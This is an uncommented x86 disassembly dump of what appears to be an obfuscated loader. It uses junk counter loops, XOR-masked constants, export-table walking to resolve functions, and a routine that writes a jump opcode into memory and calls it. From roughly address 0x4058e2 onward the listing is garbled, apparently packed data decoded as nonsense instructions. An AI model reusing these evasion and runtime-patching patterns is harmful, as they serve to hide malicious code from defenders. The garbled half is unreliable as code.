  40514e:	mov    DWORD PTR ds:0x42b00c,0x5c1b
  405158:	jne    0x405245
  40515e:	or     DWORD PTR ds:0x42a018,0x42d00c
  405168:	push   DWORD PTR [ebp+0x8]
  40516b:	sbb    DWORD PTR ds:0x429020,0x6ddf
  405175:	call   0x402803
  40517a:	mov    DWORD PTR ds:0x42a014,0x17
  405184:	cmp    DWORD PTR ds:0x42a014,0x0
  40518b:	je     0x4051de
  405191:	cmp    DWORD PTR ds:0x42a014,0xc
  405198:	jne    0x4051b2
  40519e:	push   0x42d5
  4051a3:	push   DWORD PTR [ebp-0x20]
  4051a6:	push   DWORD PTR [ebp-0x24]
  4051a9:	push   DWORD PTR [ebp-0x28]
  4051ac:	call   DWORD PTR ds:0x42e8c7
  4051b2:	cmp    DWORD PTR ds:0x42a014,0xd
  4051b9:	jne    0x4051cc
  4051bf:	mov    ecx,DWORD PTR ds:0x42a014
  4051c5:	dec    ecx
  4051c6:	mov    DWORD PTR ds:0x42a014,ecx
  4051cc:	mov    ecx,DWORD PTR ds:0x42a014
  4051d2:	dec    ecx
  4051d3:	mov    DWORD PTR ds:0x42a014,ecx
  4051d9:	jmp    0x405184
  4051de:	mov    DWORD PTR [ebp-0x14],eax
  4051e1:	mov    eax,DWORD PTR [ebp-0x4]
  4051e4:	mov    ecx,DWORD PTR [ebp-0x14]
  4051e7:	xor    eax,esi
  4051e9:	add    eax,edi
  4051eb:	cmp    ecx,eax
  4051ed:	je     0x4052d3
  4051f3:	push   DWORD PTR [ebp-0x14]
  4051f6:	push   DWORD PTR [ebp+0x8]
  4051f9:	call   0x40ea45
  4051fe:	mov    DWORD PTR [ebp-0x14],eax
  405201:	mov    eax,DWORD PTR [ebp-0x4]
  405204:	mov    ecx,DWORD PTR [ebp-0x14]
  405207:	xor    eax,esi
  405209:	add    eax,edi
  40520b:	cmp    ecx,eax
  40520d:	je     0x4052d3
  405213:	mov    eax,DWORD PTR [ebp-0x14]
  405216:	mov    eax,DWORD PTR [eax+0x18]
  405219:	mov    DWORD PTR [ebp-0x24],eax
  40521c:	mov    eax,DWORD PTR [ebp-0x14]
  40521f:	mov    ecx,DWORD PTR [ebp+0x8]
  405222:	add    ecx,DWORD PTR [eax+0x20]
  405225:	mov    DWORD PTR [ebp-0x2c],ecx
  405228:	mov    eax,DWORD PTR [ebp-0x14]
  40522b:	mov    ecx,DWORD PTR [ebp+0x8]
  40522e:	add    ecx,DWORD PTR [eax+0x24]
  405231:	mov    DWORD PTR [ebp-0x34],ecx
  405234:	mov    eax,DWORD PTR [ebp-0x14]
  405237:	mov    ecx,DWORD PTR [ebp+0x8]
  40523a:	add    ecx,DWORD PTR [eax+0x1c]
  40523d:	mov    DWORD PTR [ebp-0x14],ecx
  405240:	jmp    0x40529b
  405245:	mov    eax,DWORD PTR [ebp-0x2c]
  405248:	mov    ecx,DWORD PTR [ebp+0x8]
  40524b:	add    ecx,DWORD PTR [eax+ebx*4]
  40524e:	mov    DWORD PTR [ebp-0x28],ecx
  405251:	mov    eax,DWORD PTR [ebp-0x4]
  405254:	mov    ecx,DWORD PTR [ebp-0x28]
  405257:	xor    eax,esi
  405259:	add    eax,edi
  40525b:	cmp    ecx,eax
  40525d:	je     0x40529b
  405263:	jmp    0x40528c
  405268:	mov    eax,DWORD PTR [ebp-0x4]
  40526b:	mov    ecx,DWORD PTR [ebp-0x8]
  40526e:	xor    eax,esi
  405270:	add    eax,edi
  405272:	cmp    ecx,eax
  405274:	mov    eax,DWORD PTR [ebp-0x4]
  405277:	je     0x4052d6
  40527d:	mov    ecx,DWORD PTR [ebp-0x30]
  405280:	xor    eax,esi
  405282:	add    eax,edi
  405284:	cmp    ecx,eax
  405286:	je     0x4052df
  40528c:	lea    eax,[ebp-0x8]
  40528f:	push   eax
  405290:	push   DWORD PTR [ebp-0x28]
  405293:	push   DWORD PTR [ebp+0xc]
  405296:	call   0x40eccc
  40529b:	mov    eax,DWORD PTR [ebp-0x4]
  40529e:	mov    ecx,DWORD PTR [ebp-0x8]
  4052a1:	xor    eax,esi
  4052a3:	add    eax,edi
  4052a5:	cmp    ecx,eax
  4052a7:	je     0x4052c2
  4052ad:	mov    eax,DWORD PTR [ebp-0x34]
  4052b0:	movzx  eax,WORD PTR [eax+ebx*2]
  4052b4:	mov    ecx,DWORD PTR [ebp-0x14]
  4052b7:	mov    eax,DWORD PTR [ecx+eax*4]
  4052ba:	mov    DWORD PTR [ebp-0x38],eax
  4052bd:	jmp    0x405268
  4052c2:	mov    eax,DWORD PTR [ebp-0xc]
  4052c5:	xor    eax,esi
  4052c7:	lea    ebx,[ebx+eax*1+0x3272e2]
  4052ce:	jmp    0x404fb8
  4052d3:	mov    eax,DWORD PTR [ebp-0x4]
  4052d6:	xor    eax,esi
  4052d8:	add    eax,edi
  4052da:	jmp    0x4053fc
  4052df:	mov    eax,DWORD PTR [ebp-0x38]
  4052e2:	add    eax,DWORD PTR [ebp+0x8]
  4052e5:	mov    DWORD PTR [ebp-0x18],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x1c]
  4052eb:	test   eax,eax
  4052ed:	je     0x405387
  4052f3:	mov    DWORD PTR [ebp-0x20],0x0
  4052fa:	push   0x3
  4052fc:	xor    edx,edx
  4052fe:	pop    edx
  4052ff:	add    edx,0x8
  405302:	push   edx
  405303:	pop    ecx
  405304:	push   0x6
  405306:	dec    ecx
  405307:	pop    ebx
  405308:	dec    ebx
  405309:	xchg   ebx,ecx
  40530b:	sub    ebx,ecx
  40530d:	xchg   ebx,ecx
  40530f:	dec    ecx
  405310:	mov    eax,DWORD PTR [ebp-0x1c]
  405313:	imul   eax,ecx
  405316:	sub    esp,eax
  405318:	mov    DWORD PTR [ebp-0x20],esp
  40531b:	mov    eax,DWORD PTR [ebp-0x4]
  40531e:	xor    eax,esi
  405320:	add    eax,edi
  405322:	jmp    0x405360
  405327:	mov    ecx,DWORD PTR [ebp-0xc]
  40532a:	mov    eax,DWORD PTR [ebp+0x8]
  40532d:	mov    edx,DWORD PTR [ebp+0x14]
  405330:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  405334:	xor    ecx,esi
  405336:	add    ecx,edi
  405338:	xor    edx,edx
  40533a:	div    ecx
  40533c:	mov    ecx,DWORD PTR [ebp-0x4]
  40533f:	xor    ecx,esi
  405341:	lea    eax,[ecx+eax*1+0x3272e2]
  405348:	mov    ecx,DWORD PTR [ebp+0x8]
  40534b:	mov    edx,DWORD PTR [ebp-0x20]
  40534e:	mov    DWORD PTR [edx+ecx*4],eax
  405351:	mov    eax,DWORD PTR [ebp-0xc]
  405354:	mov    ecx,DWORD PTR [ebp+0x8]
  405357:	xor    eax,esi
  405359:	lea    eax,[eax+ecx*1+0x3272e2]
  405360:	mov    DWORD PTR [ebp+0x8],eax
  405363:	mov    eax,DWORD PTR [ebp-0xc]
  405366:	mov    ecx,DWORD PTR [ebp+0x14]
  405369:	xor    eax,esi
  40536b:	add    eax,edi
  40536d:	imul   eax,DWORD PTR [ecx]
  405370:	mov    ecx,DWORD PTR [ebp-0x4]
  405373:	mov    edx,DWORD PTR [ebp+0x8]
  405376:	xor    ecx,esi
  405378:	lea    ecx,[ecx+edx*1+0x3272e2]
  40537f:	cmp    ecx,eax
  405381:	jne    0x405327
  405387:	mov    eax,DWORD PTR [ebp-0x4]
  40538a:	xor    eax,esi
  40538c:	add    eax,edi
  40538e:	mov    DWORD PTR [ebp-0x10],eax
  405391:	mov    ebx,0x65655
  405396:	add    ebx,0x3234
  40539c:	xchg   ebx,esi
  40539e:	xor    ebx,ebx
  4053a0:	push   esi
  4053a1:	mov    esi,ebx
  4053a3:	pop    ebx
  4053a4:	mov    edx,esi
  4053a6:	add    ebx,0x1002
  4053ac:	lea    eax,[ebp-0x18]
  4053af:	add    edx,eax
  4053b1:	add    edx,0x5
  4053b4:	push   edx
  4053b5:	inc    esi
  4053b6:	pop    ecx
  4053b7:	dec    ecx
  4053b8:	xchg   ecx,eax
  4053b9:	dec    eax
  4053ba:	xchg   ecx,eax
  4053bb:	dec    ecx
  4053bc:	xchg   ecx,edx
  4053be:	dec    edx
  4053bf:	push   edx
  4053c0:	mov    edx,ebx
  4053c2:	pop    ebx
  4053c3:	dec    ebx
  4053c4:	call   DWORD PTR [ebx]
  4053c6:	cmp    DWORD PTR [ebp+0x10],esi
  4053c9:	je     0x4053e8
  4053cf:	xchg   edx,eax
  4053d0:	push   0xb
  4053d2:	pop    ecx
  4053d3:	push   0x4
  4053d5:	pop    ebx
  4053d6:	inc    ebx
  4053d7:	xchg   ebx,ecx
  4053d9:	sub    ebx,ecx
  4053db:	xchg   ebx,ecx
  4053dd:	dec    ecx
  4053de:	dec    ecx
  4053df:	mov    eax,DWORD PTR [ebp-0x1c]
  4053e2:	imul   eax,ecx
  4053e5:	add    esp,eax
  4053e7:	xchg   edx,eax
  4053e8:	push   eax
  4053e9:	xor    ebx,ebx
  4053eb:	mov    edx,esp
  4053ed:	dec    edx
  4053ee:	inc    ebx
  4053ef:	add    ebx,DWORD PTR [edx+ebx*1]
  4053f2:	dec    ebx
  4053f3:	xor    edx,edx
  4053f5:	add    DWORD PTR [ebp-0x10],ebx
  4053f8:	pop    ebx
  4053f9:	mov    eax,DWORD PTR [ebp-0x10]
  4053fc:	pop    edi
  4053fd:	pop    esi
  4053fe:	pop    ebx
  4053ff:	leave  
  405400:	ret    0x10
  405403:	push   ebp
  405404:	mov    ebp,esp
  405406:	sub    esp,0x7c
  405409:	mov    DWORD PTR ds:0x42c018,0x17
  405413:	cmp    DWORD PTR ds:0x42c018,0x0
  40541a:	je     0x40544a
  405420:	cmp    DWORD PTR ds:0x42c018,0x20
  405427:	jne    0x405438
  40542d:	push   0x8a80
  405432:	call   DWORD PTR ds:0x42e8cb
  405438:	mov    eax,ds:0x42c018
  40543d:	dec    eax
  40543e:	mov    ds:0x42c018,eax
  405443:	jmp    0x405413
  405448:	adc    eax,ecx
  40544a:	push   esi
  40544b:	sub    esi,0x3b9
  405451:	push   edi
  405452:	mov    edi,DWORD PTR ds:0x41ce18
  405458:	mov    eax,ds:0x41cd89
  40545d:	sub    edi,eax
  40545f:	add    edi,DWORD PTR [edi+eax*1]
  405462:	mov    eax,ds:0x42e2b7
  405467:	and    DWORD PTR ds:0x42b018,0x0
  405471:	jmp    0x405483
  405476:	mov    ecx,DWORD PTR ds:0x42b018
  40547c:	inc    ecx
  40547d:	mov    DWORD PTR ds:0x42b018,ecx
  405483:	cmp    DWORD PTR ds:0x42b018,0x10
  40548a:	jae    0x4054d5
  405490:	cmp    DWORD PTR ds:0x42b018,0x5
  405497:	jne    0x4054b3
  40549d:	push   0x429020
  4054a2:	push   DWORD PTR [ebp-0x20]
  4054a5:	push   DWORD PTR [ebp-0x20]
  4054a8:	push   0x7ab5
  4054ad:	call   DWORD PTR ds:0x42e8cf
  4054b3:	cmp    DWORD PTR ds:0x42b018,0x4
  4054ba:	jne    0x4054cf
  4054c0:	xor    ecx,ecx
  4054c2:	or     ecx,DWORD PTR ds:0x42b018
  4054c8:	inc    ecx
  4054c9:	mov    DWORD PTR ds:0x42b018,ecx
  4054cf:	jmp    0x405476
  4054d4:	dec    edi
  4054d5:	mov    DWORD PTR [ebp-0x24],eax
  4054d8:	sbb    eax,DWORD PTR ds:0x42d000
  4054de:	mov    eax,ds:0x42e3c3
  4054e3:	mov    DWORD PTR [ebp-0x34],eax
  4054e6:	mov    DWORD PTR ds:0x42c014,0x14
  4054f0:	cmp    DWORD PTR ds:0x42c014,0x0
  4054f7:	je     0x405540
  4054fd:	cmp    DWORD PTR ds:0x42c014,0x2
  405504:	jne    0x405515
  40550a:	push   0x6dea
  40550f:	call   DWORD PTR ds:0x42e913
  405515:	cmp    DWORD PTR ds:0x42c014,0x3
  40551c:	jne    0x405530
  405522:	xor    eax,eax
  405524:	xor    eax,DWORD PTR ds:0x42c014
  40552a:	dec    eax
  40552b:	mov    ds:0x42c014,eax
  405530:	mov    eax,ds:0x42c014
  405535:	dec    eax
  405536:	mov    ds:0x42c014,eax
  40553b:	jmp    0x4054f0
  405540:	and    DWORD PTR [ebp-0x30],0x0
  405544:	mov    eax,ds:0x41cd9d
  405549:	mov    eax,DWORD PTR [eax]
  40554b:	adc    DWORD PTR ds:0x42c010,eax
  405551:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  405558:	add    edi,edi
  40555a:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405561:	mov    eax,DWORD PTR [ebp-0x10]
  405564:	mov    ecx,DWORD PTR [ebp-0x10]
  405567:	and    DWORD PTR ds:0x42c000,0x0
  405571:	jmp    0x405583
  405576:	mov    edi,DWORD PTR ds:0x42c000
  40557c:	inc    edi
  40557d:	mov    DWORD PTR ds:0x42c000,edi
  405583:	cmp    DWORD PTR ds:0x42c000,0x19
  40558a:	jae    0x4055bb
  405590:	cmp    DWORD PTR ds:0x42c000,0x1c
  405597:	jne    0x4055b0
  40559d:	push   DWORD PTR [ebp-0x20]
  4055a0:	push   0x5aa1
  4055a5:	push   0x4e93
  4055aa:	call   DWORD PTR ds:0x42e8d3
  4055b0:	jmp    0x405576
  4055b5:	and    esi,DWORD PTR ds:0x42b004
  4055bb:	sub    eax,ecx
  4055bd:	adc    DWORD PTR ds:0x42c014,ecx
  4055c3:	mov    DWORD PTR [ebp-0x10],eax
  4055c6:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  4055cd:	sbb    esi,ecx
  4055cf:	mov    eax,DWORD PTR [ebp-0x18]
  4055d2:	mov    ecx,DWORD PTR [ebp-0x18]
  4055d5:	or     DWORD PTR ds:0x42a00c,ecx
  4055db:	sub    eax,ecx
  4055dd:	mov    DWORD PTR [ebp-0x18],eax
  4055e0:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4055e7:	add    esi,DWORD PTR ds:0x42b018
  4055ed:	mov    eax,DWORD PTR [ebp-0xc]
  4055f0:	xor    edi,edi
  4055f2:	xor    edi,DWORD PTR ds:0x41cdd8
  4055f8:	mov    esi,DWORD PTR ds:0x41ce34
  4055fe:	sub    esi,edi
  405600:	imul   edi,DWORD PTR [edi+esi*1]
  405604:	mov    ecx,DWORD PTR [ebp-0xc]
  405607:	mov    DWORD PTR ds:0x429020,0x15
  405611:	cmp    DWORD PTR ds:0x429020,0x0
  405618:	je     0x40566c
  40561e:	cmp    DWORD PTR ds:0x429020,0xb
  405625:	jne    0x40563e
  40562b:	push   DWORD PTR [ebp-0x24]
  40562e:	push   0x42e000
  405633:	push   0x429018
  405638:	call   DWORD PTR ds:0x42e917
  40563e:	cmp    DWORD PTR ds:0x429020,0xc
  405645:	jne    0x40565a
  40564b:	xor    esi,esi
  40564d:	or     esi,DWORD PTR ds:0x429020
  405653:	dec    esi
  405654:	mov    DWORD PTR ds:0x429020,esi
  40565a:	mov    esi,DWORD PTR ds:0x429020
  405660:	dec    esi
  405661:	mov    DWORD PTR ds:0x429020,esi
  405667:	jmp    0x405611
  40566c:	sub    eax,ecx
  40566e:	mov    DWORD PTR [ebp-0xc],eax
  405671:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  405678:	mov    eax,DWORD PTR [ebp-0x1c]
  40567b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40567e:	sub    eax,ecx
  405680:	mov    DWORD PTR [ebp-0x1c],eax
  405683:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  40568a:	mov    eax,DWORD PTR [ebp-0x20]
  40568d:	mov    ecx,DWORD PTR [ebp-0x20]
  405690:	sub    eax,ecx
  405692:	mov    DWORD PTR [ebp-0x20],eax
  405695:	mov    eax,DWORD PTR [ebp-0x2c]
  405698:	mov    ecx,DWORD PTR [ebp-0x20]
  40569b:	mov    esi,0x751089b
  4056a0:	xor    eax,esi
  4056a2:	mov    edi,0x3272e2
  4056a7:	add    eax,edi
  4056a9:	or     eax,ecx
  4056ab:	mov    DWORD PTR [ebp-0x20],eax
  4056ae:	mov    eax,DWORD PTR [ebp-0x4]
  4056b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4056b4:	sub    eax,ecx
  4056b6:	mov    DWORD PTR [ebp-0x4],eax
  4056b9:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  4056c0:	mov    eax,DWORD PTR [ebp-0xc]
  4056c3:	xor    eax,esi
  4056c5:	add    eax,edi
  4056c7:	push   eax
  4056c8:	mov    eax,DWORD PTR [ebp-0x10]
  4056cb:	xor    eax,esi
  4056cd:	add    eax,edi
  4056cf:	push   eax
  4056d0:	mov    eax,DWORD PTR [ebp-0x4]
  4056d3:	xor    eax,esi
  4056d5:	add    eax,edi
  4056d7:	push   eax
  4056d8:	lea    eax,[ebp-0x7c]
  4056db:	push   eax
  4056dc:	push   DWORD PTR [ebp-0x2c]
  4056df:	push   DWORD PTR [ebp-0x28]
  4056e2:	call   0x40ebe9
  4056e7:	test   eax,eax
  4056e9:	je     0x405717
  4056ef:	lea    eax,[ebp-0x7c]
  4056f2:	push   eax
  4056f3:	mov    eax,DWORD PTR [ebp-0x28]
  4056f6:	xor    eax,esi
  4056f8:	add    eax,edi
  4056fa:	push   eax
  4056fb:	mov    eax,DWORD PTR [ebp-0x24]
  4056fe:	add    eax,0xaa
  405703:	push   eax
  405704:	mov    eax,DWORD PTR [ebp-0x24]
  405707:	mov    eax,DWORD PTR [eax+0x198]
  40570d:	push   DWORD PTR [eax]
  40570f:	call   0x40294c
  405714:	mov    DWORD PTR [ebp-0x14],eax
  405717:	lea    eax,[ebp+0x4]
  40571a:	mov    DWORD PTR [ebp-0x30],eax
  40571d:	mov    eax,DWORD PTR [ebp-0x14]
  405720:	test   eax,eax
  405722:	je     0x40578a
  405728:	lea    eax,[ebp-0x8]
  40572b:	mov    DWORD PTR [ebp-0x38],eax
  40572e:	mov    eax,DWORD PTR [ebp-0x34]
  405731:	mov    DWORD PTR [ebp-0x8],eax
  405734:	mov    eax,DWORD PTR [ebp-0x8]
  405737:	mov    ecx,DWORD PTR [ebp-0x14]
  40573a:	sub    eax,ecx
  40573c:	mov    DWORD PTR [ebp-0x8],eax
  40573f:	mov    ecx,DWORD PTR [ebp-0x4]
  405742:	xor    ecx,esi
  405744:	mov    eax,0xffcd8d1e
  405749:	sub    eax,ecx
  40574b:	add    DWORD PTR [ebp-0x8],eax
  40574e:	mov    eax,DWORD PTR [ebp-0x8]
  405751:	mov    ecx,DWORD PTR [ebp-0x14]
  405754:	mov    DWORD PTR [ecx+0x1],eax
  405757:	mov    eax,DWORD PTR [ebp-0x14]
  40575a:	push   DWORD PTR [ebp-0x24]
  40575d:	mov    BYTE PTR [eax],0xe9
  405760:	mov    eax,ds:0x42e133
  405765:	push   DWORD PTR [eax]
  405767:	push   DWORD PTR ds:0x42e38f
  40576d:	push   DWORD PTR ds:0x42e13b
  405773:	push   DWORD PTR ds:0x42e36f
  405779:	push   DWORD PTR ds:0x42e683
  40577f:	push   DWORD PTR [ebp-0x28]
  405782:	push   DWORD PTR [ebp-0x2c]
  405785:	mov    eax,DWORD PTR [ebp-0x14]
  405788:	call   eax
  40578a:	mov    eax,DWORD PTR [ebp-0x30]
  40578d:	mov    ecx,DWORD PTR ds:0x42e333
  405793:	add    DWORD PTR [eax],ecx
  405795:	pop    edi
  405796:	pop    esi
  405797:	leave  
  405798:	ret    
  405799:	push   ebp
  40579a:	mov    ebp,esp
  40579c:	sub    esp,0x18
  40579f:	mov    DWORD PTR ds:0x429014,0x19
  4057a9:	cmp    DWORD PTR ds:0x429014,0x0
  4057b0:	je     0x405814
  4057b6:	cmp    DWORD PTR ds:0x429014,0xd
  4057bd:	jne    0x4057d5
  4057c3:	push   DWORD PTR [ebp-0x20]
  4057c6:	push   DWORD PTR [ebp-0x24]
  4057c9:	push   DWORD PTR [ebp-0x24]
  4057cc:	push   DWORD PTR [ebp-0x28]
  4057cf:	call   DWORD PTR ds:0x42e8d7
  4057d5:	cmp    DWORD PTR ds:0x429014,0xe
  4057dc:	jne    0x4057f1
  4057e2:	xor    edx,edx
  4057e4:	xor    edx,DWORD PTR ds:0x429014
  4057ea:	dec    edx
  4057eb:	mov    DWORD PTR ds:0x429014,edx
  4057f1:	mov    edx,DWORD PTR ds:0x429014
  4057f7:	dec    edx
  4057f8:	mov    DWORD PTR ds:0x429014,edx
  4057fe:	jmp    0x4057a9
  405803:	mov    ecx,DWORD PTR ds:0x41cd6d
  405809:	mov    edx,DWORD PTR ds:0x41cd85
  40580f:	sub    edx,ecx
  405811:	and    ecx,DWORD PTR [ecx+edx*1]
  405814:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  40581b:	sub    DWORD PTR ds:0x42d00c,0x7538
  405825:	lea    eax,[ebp+0x14]
  405828:	mov    DWORD PTR [ebp-0x4],eax
  40582b:	movzx  edx,WORD PTR ds:0x42b014
  405832:	sbb    DWORD PTR ds:0x42d01c,edx
  405838:	push   esi
  405839:	mov    esi,0xf89c8585
  40583e:	mov    edx,DWORD PTR ds:0x42d008
  405844:	and    DWORD PTR ds:0x42c010,edx
  40584a:	mov    DWORD PTR [ebp-0xc],esi
  40584d:	sbb    DWORD PTR ds:0x42900c,0x3284
  405857:	lea    eax,[ebp-0xc]
  40585a:	add    DWORD PTR ds:0x429024,0x6cdb
  405864:	mov    DWORD PTR [ebp-0x14],eax
  405867:	neg    eax
  405869:	mov    eax,DWORD PTR [ebp-0xc]
  40586c:	sbb    ecx,0x367b
  405872:	mov    edx,DWORD PTR [ebp-0x14]
  405875:	mov    ecx,0x751089b
  40587a:	sbb    DWORD PTR ds:0x42900c,0x429014
  405884:	xor    eax,ecx
  405886:	and    DWORD PTR ds:0x429014,0x429028
  405890:	add    eax,0x3272e2
  405895:	mov    DWORD PTR [edx],eax
  405897:	adc    edx,DWORD PTR ds:0x42d014
  40589d:	mov    eax,ds:0x42e12f
  4058a2:	adc    edx,DWORD PTR ds:0x42d008
  4058a8:	mov    edx,DWORD PTR [ebp-0x4]
  4058ab:	mov    eax,DWORD PTR [eax]
  4058ad:	xor    DWORD PTR ds:0x42b000,0x42a008
  4058b7:	add    eax,DWORD PTR [edx]
  4058b9:	push   edi
  4058ba:	and    edx,DWORD PTR ds:0x42a00c
  4058c0:	mov    DWORD PTR [ebp-0x8],eax
  4058c3:	movzx  eax,WORD PTR ds:0x42b000
  4058ca:	sub    DWORD PTR ds:0x42a010,eax
  4058d0:	mov    edi,DWORD PTR [ebp+0x8]
  4058d3:	xor    DWORD PTR ds:0x429018,0x6981
  4058dd:	jmp    0x407c2c
  4058e2:	mov    dh,0x31
  4058e4:	mov    ecx,0xb277bb1f
  4058e9:	jno    0x405908
  4058eb:	push   edi
  4058ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ed:	xor    DWORD PTR ds:0x34cc90d1,esp
  4058f3:	pop    edi
  4058f4:	jl     0x405972
  4058f6:	dec    esi
  4058f7:	pop    edi
  4058f8:	jl     0x405976
  4058fa:	loop   0x405895
  4058fc:	sub    al,0x56
  4058fe:	call   0x9438d213
  405903:	dec    edx
  405904:	daa    
  405905:	jl     0x40593e
  405907:	scas   eax,DWORD PTR es:[edi]
  405908:	outs   dx,BYTE PTR ds:[esi]
  405909:	call   0xd604:0xcbe48537
  405910:	xchg   edi,eax
  405911:	mov    eax,0x65944628
  405916:	popf   
  405917:	mov    WORD PTR [ebp+0x151fb8e3],?
  40591d:	mov    al,ds:0xfd331ed
  405922:	jl     0x405980
  405924:	sbb    al,0xea
  405926:	sbb    eax,0x268a0787
  40592b:	call   0x6e52d42f
  405930:	ins    DWORD PTR es:[edi],dx
  405931:	stos   DWORD PTR es:[edi],eax
  405932:	pop    edx
  405933:	inc    eax
  405934:	sbb    eax,0xa52d8729
  405939:	mov    ebx,0x12ff9a31
  40593e:	ret    0xff43
  405941:	rcr    DWORD PTR [ebp-0x35cc4990],cl
  405947:	fcom   DWORD PTR [edi-0x2a]
  40594a:	xchg   ecx,eax
  40594b:	lds    esi,FWORD PTR [ecx]
  40594d:	xchg   ecx,eax
  40594e:	mov    DWORD PTR [eax],0x67f5d44c
  405954:	in     eax,dx
  405955:	push   ss
  405956:	xchg   edx,eax
  405957:	nop
  405958:	hlt    
  405959:	inc    dh
  40595b:	inc    esi
  40595c:	aas    
  40595d:	sub    BYTE PTR [ebp+0x44],dl
  405960:	cmp    bh,cl
  405962:	out    dx,eax
  405963:	add    eax,0xf124305b
  405968:	jmp    0xcbb:0xd85cc8d
  40596f:	cmp    al,0xd5
  405971:	adc    esp,ebp
  405973:	sub    eax,0xc0ae87a8
  405978:	call   0xfc523cbd
  40597d:	mov    al,ds:0xeba8dce9
  405982:	aam    0x6a
  405984:	xchg   ebp,eax
  405985:	add    DWORD PTR [edx],eax
  405987:	sbb    bh,BYTE PTR ds:0x9a37e0b7
  40598d:	sub    al,0xce
  40598f:	jmp    0x405959
  405991:	ret    0xfe56
  405994:	inc    ecx
  405995:	gs sti 
  405997:	jbe    0x4059ae
  405999:	js     0x405978
  40599b:	push   ebx
  40599c:	sbb    DWORD PTR [esi+0x6e8db795],esi
  4059a2:	cmp    esi,DWORD PTR [ecx-0x3f]
  4059a5:	dec    eax
  4059a6:	jmp    0x8e1c1dbb
  4059ab:	xchg   esp,eax
  4059ac:	mov    edx,0x61f42fe0
  4059b1:	pushf  
  4059b2:	push   ecx
  4059b3:	push   ss
  4059b4:	push   ss
  4059b5:	inc    edi
  4059b6:	xor    edx,eax
  4059b8:	(bad)  
  4059b9:	in     al,dx
  4059ba:	sbb    BYTE PTR [edx+0x1c],al
  4059bd:	add    DWORD PTR [edi+0x1b],0xffffffc2
  4059c1:	popf   
  4059c2:	ss sub ecx,eax
  4059c5:	lahf   
  4059c6:	mov    esi,0x2c8a758a
  4059cb:	fistp  QWORD PTR [ecx]
  4059cd:	jmp    0xccbe:0xabbcc522
  4059d4:	jo     0x405a42
  4059d6:	xchg   BYTE PTR ds:0x4d08657c,al
  4059dc:	or     DWORD PTR ds:[ecx],0x7a
  4059e0:	xchg   esp,eax
  4059e1:	sub    DWORD PTR [edx+0x4b],0x20b914eb
  4059e8:	or     bl,BYTE PTR [edi]
  4059ea:	sbb    eax,0x3821f1a8
  4059ef:	outs   dx,DWORD PTR ds:[esi]
  4059f0:	in     al,0x6a
  4059f2:	push   ebp
  4059f3:	iret   
  4059f4:	stos   BYTE PTR es:[edi],al
  4059f5:	mov    ah,0x6f
  4059f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059f8:	push   es
  4059f9:	mov    eax,0xd81806e2
  4059fe:	sub    al,0xb9
  405a00:	aas    
  405a01:	jg     0x405a7e
  405a03:	or     bl,BYTE PTR [edi+0xa]
  405a06:	lahf   
  405a07:	imul   esp,DWORD PTR [ebx+0x7d],0xfffffff1
  405a0b:	jle    0x405a7d
  405a0d:	arpl   si,di
  405a0f:	ins    BYTE PTR es:[edi],dx
  405a10:	cmp    edi,edi
  405a12:	mov    DWORD PTR [ecx-0x26e823e0],eax
  405a18:	xor    BYTE PTR [edx+0x7a],ah
  405a1b:	nop
  405a1c:	in     eax,dx
  405a1d:	imul   DWORD PTR [di-0x2d]
  405a21:	pop    ss
  405a22:	scas   eax,DWORD PTR es:[edi]
  405a23:	push   edi
  405a24:	dec    edi
  405a25:	and    BYTE PTR [ebx-0x6849db2d],ah
  405a2b:	popf   
  405a2c:	cmc    
  405a2d:	xchg   esi,eax
  405a2e:	cmc    
  405a2f:	xchg   esp,eax
  405a30:	pop    esp
  405a31:	loop   0x405a6f
  405a33:	mov    ecx,0xbef8f827
  405a38:	hlt    
  405a39:	adc    cl,BYTE PTR [eax+0x7e]
  405a3c:	loopne 0x4059ce
  405a3e:	(bad)  
  405a3f:	xor    DWORD PTR [esi+0x1cf593bc],esi
  405a45:	jg     0x4059cd
  405a47:	jo     0x405a0f
  405a49:	repnz xor bh,dh
  405a4c:	or     eax,0x961ebccc
  405a51:	jbe    0x405a15
  405a53:	sbb    ebx,DWORD PTR [ebx+ecx*4]
  405a56:	es cmp al,0xf4
  405a59:	fistp  DWORD PTR [ecx-0x67]
  405a5c:	pop    ds
  405a5d:	adc    DWORD PTR es:[ebx+eiz*2+0x7903cd0f],esi
  405a65:	add    al,cl
  405a67:	or     al,0xf5
  405a69:	dec    ebp
  405a6a:	imul   esp,DWORD PTR [eax-0x31c17733],0xffffffe4
  405a71:	scas   al,BYTE PTR es:[edi]
  405a72:	les    edi,FWORD PTR [esi+0x377ae869]
  405a78:	sbb    al,0x9b
  405a7a:	mov    esp,ebx
  405a7c:	cli    
  405a7d:	xchg   dl,bh
  405a7f:	push   esi
  405a80:	mov    bl,0xfc
  405a82:	(bad)  ds:0x9a46da33
  405a88:	sbb    eax,esp
  405a8a:	test   BYTE PTR [eax],cl
  405a8c:	mov    eax,ds:0xcabc636b
  405a91:	or     BYTE PTR [ecx],0xff
  405a94:	in     eax,0x10
  405a96:	xchg   DWORD PTR [edi+ebx*8+0x48],ebx
  405a9a:	dec    esi
  405a9b:	pop    ecx
  405a9c:	(bad)  
  405a9e:	adc    DWORD PTR [eax+0x22],eax
  405aa1:	rcl    DWORD PTR [eax],cl
  405aa3:	adc    DWORD PTR [edx-0x7730fa81],0xc21b05b6
  405aad:	mov    ds:0xe3c0b6f3,eax
  405ab2:	into   
  405ab3:	adc    DWORD PTR [esi+0x6f],0x7aa26ab0
  405aba:	bound  ecx,QWORD PTR [esi]
  405abc:	div    cl
  405abe:	or     al,0xac
  405ac0:	out    0x3,eax
  405ac2:	add    BYTE PTR [edx],cl
  405ac4:	inc    eax
  405ac5:	je     0x405b37
  405ac7:	idiv   DWORD PTR [ecx+0x3b]
  405aca:	push   ss
  405acb:	ins    BYTE PTR es:[edi],dx
  405acc:	adc    DWORD PTR [eax],eax
